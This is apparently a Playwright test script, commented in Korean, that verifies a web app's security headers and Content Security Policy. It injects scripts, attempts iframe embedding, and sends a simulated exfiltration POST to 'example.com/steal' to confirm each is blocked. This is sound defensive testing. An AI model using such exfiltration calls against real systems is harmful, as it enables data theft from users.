import { ROOT, CHROME } from './_env.mjs';
import { spawn, stopProcess } from './_process.mjs';
import { chromium } from 'playwright-core';
// 보안 헤더 · 콘텐츠 보안 정책(CSP) — 헤더가 붙는지, 실제로 막는지, 앱이 스스로 막히지 않는지
const PORT = 5190;
const env = { ...process.env, PUBLIC_SUPABASE_URL: 'https://fake-proj.supabase.co', PUBLIC_SUPABASE_PUBLISHABLE_KEY: 'sb_publishable_testtesttesttesttest' };
const vite = spawn('npx', ['vite', 'dev', '--port', String(PORT), '--strictPort'], { cwd: ROOT, env, stdio: ['ignore', 'pipe', 'pipe'], detached: true });
let out = ''; vite.stdout.on('data', (d) => (out += d));
for (let i = 0; i < 120 && !out.includes('ready'); i++) await new Promise((r) => setTimeout(r, 500));
let pass = 0, fail = 0;
const check = (n, ok, d = '') => { ok ? pass++ : fail++; console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${n}${ok ? '' : '  ' + d}`); };
const U = (p) => `http://localhost:${PORT}${p}`;
const browser = await chromium.launch({ executablePath: CHROME });
try {
	console.log('[헤더]');
	for (const path of ['/login', '/dev/chat', '/admin/login']) {
		const h = (await fetch(U(path), { redirect: 'manual' })).headers;
		const csp = h.get('content-security-policy') ?? '';
		check(`${path}: CSP (스크립트 nonce · 틀 금지 · 연결은 우리+Supabase)`,
			/script-src 'self' 'nonce-/.test(csp) && csp.includes("frame-ancestors 'none'") && csp.includes('https://*.supabase.co') && csp.includes("object-src 'none'"), csp);
		check(`${path}: X-Frame-Options · nosniff · Permissions-Policy`,
			h.get('x-frame-options') === 'DENY' && h.get('x-content-type-options') === 'nosniff' && /camera=\(\)/.test(h.get('permissions-policy') ?? ''));
	}
	const adm = (await fetch(U('/admin/login'))).headers;
	check('운영자 화면은 더 엄격하게 (no-referrer · no-store)', adm.get('referrer-policy') === 'no-referrer' && adm.get('cache-control') === 'no-store');
	check('학생 화면 Referrer-Policy', (await fetch(U('/login'))).headers.get('referrer-policy') === 'strict-origin-when-cross-origin');

	const ctx = await browser.newContext({ viewport: { width: 390, height: 800 } });
	const page = await ctx.newPage();
	const violations = [], errs = [];
	page.on('console', (m) => /Content Security Policy|Refused to/.test(m.text()) && violations.push(m.text().slice(0, 160)));
	page.on('pageerror', (e) => errs.push(String(e)));

	console.log('[앱이 스스로 막히지 않는다]');
	const sb = [];
	await page.route(/fake-proj\.supabase\.co/, (r) => { sb.push(r.request().url()); r.fulfill({ status: 400, contentType: 'application/json', body: '{"error":"invalid_grant","error_description":"x"}' }); });
	await page.goto(U('/dev/chat?s=chat&matched'));
	await page.locator('.bubble', { hasText: '안녕하세요!' }).waitFor();
	await page.waitForTimeout(1800); // 연결 화면 애니메이션 · 인라인 스타일
	await page.goto(U('/login'));
	// 비밀번호 찾기 → 인증 코드 받기 = 브라우저에서 Supabase 로 바로 가는 요청
	await page.getByRole('button', { name: '비밀번호를 잊었어요' }).click();
	await page.getByPlaceholder('학교 이메일 앞부분').fill('29999');
	await page.getByRole('button', { name: '인증 코드 받기' }).click();
	await page.waitForTimeout(1500);
	check('로그인 요청이 Supabase 로 나간다 (connect-src 허용)', sb.length > 0, String(sb.length));
	// 화면 모드(설정) — app.html 의 짧은 스크립트가 nonce 로 허용되어 첫 화면 전에 입히는지
	await page.evaluate(() => localStorage.setItem('theme-v1', 'dark'));
	await page.goto(U('/login'));
	check('★ 화면 모드 스크립트가 CSP 에 막히지 않는다 (nonce)', (await page.evaluate(() => document.documentElement.dataset.theme)) === 'dark');
	await page.evaluate(() => localStorage.removeItem('theme-v1'));
	check('채팅·로그인 화면에 CSP 위반 없음', violations.length === 0, violations.join(' | '));
	check('페이지 오류 없음', errs.length === 0, errs.join(' | '));

	console.log('[실제로 막는다]');
	violations.length = 0;
	const ran = await page.evaluate(async () => {
		const s = document.createElement('script');
		s.textContent = 'window.__injected = 1';
		document.head.append(s);
		await new Promise((r) => setTimeout(r, 100));
		return window.__injected === 1;
	});
	check('nonce 없는 인라인 스크립트는 실행되지 않는다', !ran);
	const ext = await page.evaluate(() => new Promise((res) => {
		const s = document.createElement('script');
		s.src = 'https://cdn.jsdelivr.net/npm/lodash/lodash.min.js';
		s.onload = () => res('loaded'); s.onerror = () => res('blocked');
		document.head.append(s);
		setTimeout(() => res('timeout'), 3000);
	}));
	check('외부 스크립트는 불러오지 않는다', ext === 'blocked', ext);
	const conn = await page.evaluate(() => fetch('https://example.com/steal', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'blocked'));
	check('허용 안 된 곳으로는 보낼 수 없다', conn === 'blocked', conn);
	check('막힌 것은 CSP 위반으로 기록됨', violations.length >= 2, violations.join(' | '));

	console.log('[틀 안에 띄우기]');
	const host = await ctx.newPage();
	// 다른 사이트(빈 페이지)가 우리 화면을 틀로 띄우려는 상황 — 막히면 load 가 안 올 수 있어서 DOM 까지만 기다린다
	await host.setContent(`<iframe id="f" src="${U('/login')}" width="300" height="300"></iframe>`, { waitUntil: 'domcontentloaded' });
	await host.waitForTimeout(2500);
	const urls = host.frames().slice(1).map((f) => f.url());
	// 막히면 Chrome 은 틀 안을 오류 페이지로 바꾼다 — 주소가 chrome-error:// 또는 빈 값(Chrome 156~). 헤더 없는 페이지는 제 주소로 열린다 (직접 대조해 봄)
	check('다른 페이지의 iframe 안에서는 열리지 않는다', urls.length === 1 && (urls[0] === '' || urls[0].startsWith('chrome-error://')), urls.join());
} catch (e) { fail++; console.error(e); }
finally {
	await browser.close();
	stopProcess(vite);
}
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
